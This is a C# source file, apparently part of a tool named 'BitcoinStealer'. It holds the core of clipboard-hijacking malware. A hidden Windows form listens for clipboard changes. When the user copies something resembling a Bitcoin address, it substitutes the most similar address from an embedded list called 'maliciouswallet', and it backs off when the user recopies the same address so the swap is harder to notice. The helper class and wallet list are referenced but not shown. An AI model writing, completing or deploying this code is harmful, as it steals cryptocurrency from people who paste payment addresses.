using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace BitcoinStealer
{
    public partial class FormBackground : Form
    {
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        private string _origClpbrdTxt;

        // Never use Form.Load or Shown, because they will never run!
        public FormBackground()
        {
            InitializeComponent();

            AddClipboardFormatListener(Handle);
        }

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);

            // if not clipboardchange happened return
            if (m.Msg != 0x031D) return;

            // if clipboard doesnt contain text return
            if (!Clipboard.ContainsText()) return;

            var clpbrd = Clipboard.GetText();

            // if clpbrd probably not btc address return
            if (!stealer.ProbablyBtcAddress(clpbrd)) return;

            // if this is the second time the user copied, do not force it, return
            if (clpbrd == _origClpbrdTxt) return;
            _origClpbrdTxt = clpbrd;

            // if clpbrd is already among the addresses return
            if (
                Resources.maliciouswallet.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)
                    .ToList()
                    .Contains(clpbrd)) return;

            // find and set the most similar btc address
            stealer.SetMostSimilarBtcAddress(clpbrd);
        }
    }
}
